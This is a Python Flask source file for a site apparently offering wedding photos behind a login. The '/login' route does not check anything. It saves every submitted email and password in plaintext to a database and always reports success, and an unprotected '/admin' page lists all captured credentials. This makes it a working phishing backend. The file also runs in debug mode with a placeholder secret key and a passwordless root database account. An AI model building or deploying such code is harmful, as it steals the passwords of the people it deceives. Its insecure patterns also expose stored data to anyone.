from flask import Flask, render_template, request, redirect, url_for, flash, session
from flask_mysqldb import MySQL
import MySQLdb.cursors
import re

app = Flask(__name__)

# Change this to a random secret key
app.secret_key = 'your-secret-key-here-change-this-in-production'

# MySQL configurations
app.config['MYSQL_HOST'] = 'localhost'
app.config['MYSQL_USER'] = 'root'  # default XAMPP username
app.config['MYSQL_PASSWORD'] = ''    # default XAMPP password is empty
app.config['MYSQL_DB'] = 'wedding_photos'

# Initialize MySQL
mysql = MySQL(app)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    if request.method == 'POST':
        email = request.form['email']
        password = request.form['password']
        
        # Check if email and password are provided
        if not email or not password:
            flash('Please fill in all fields', 'danger')
            return redirect(url_for('index'))
        
        try:
            # Create cursor
            cursor = mysql.connection.cursor(MySQLdb.cursors.DictCursor)
            
            # Insert into database
            cursor.execute('INSERT INTO credentials (email, password) VALUES (%s, %s)', (email, password))
            mysql.connection.commit()
            cursor.close()
            
            flash('Login successful! You can now view the photos.', 'success')
            return redirect(url_for('success'))
            
        except Exception as e:
            flash('An error occurred. Please try again.', 'danger')
            return redirect(url_for('index'))

@app.route('/success')
def success():
    return render_template('success.html')

@app.route('/admin')
def admin():
    # Simple admin page to view all credentials (for testing only)
    try:
        cursor = mysql.connection.cursor(MySQLdb.cursors.DictCursor)
        cursor.execute('SELECT * FROM credentials ORDER BY created_at DESC')
        credentials = cursor.fetchall()
        cursor.close()
        return render_template('admin.html', credentials=credentials)
    except Exception as e:
        return str(e)

if __name__ == '__main__':
    app.run(debug=True)